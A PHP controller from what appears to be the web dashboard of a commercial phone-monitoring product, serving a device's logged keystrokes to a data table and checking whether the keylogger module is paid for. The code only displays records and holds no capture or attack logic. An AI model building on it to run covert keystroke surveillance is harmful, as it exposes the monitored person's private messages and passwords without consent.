<?php

namespace Controllers;

use Models\Modules,
    CS\Devices\Limitations;

class Keylogger extends BaseModuleController {

    protected $module = Modules::KEYLOGGER;
    
    protected function init() {
        parent::init();

        $this->initCP();
    }
    
    public function indexAction() {
        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            $data = $keyloggerModel->getDataTableData(
                    $this->di['devId'], 
                    $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
            );
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        if ($this->view->paid) {
            $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
        }
        
        $this->setView('cp/keylogger.htm');
    }
    
    protected function postAction() {
        parent::postAction();
        $this->buildCpMenu();
        
        $this->view->title = $this->di['t']->_('Keylogger');
    }
    
    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::KEYLOGGER);
    }

}
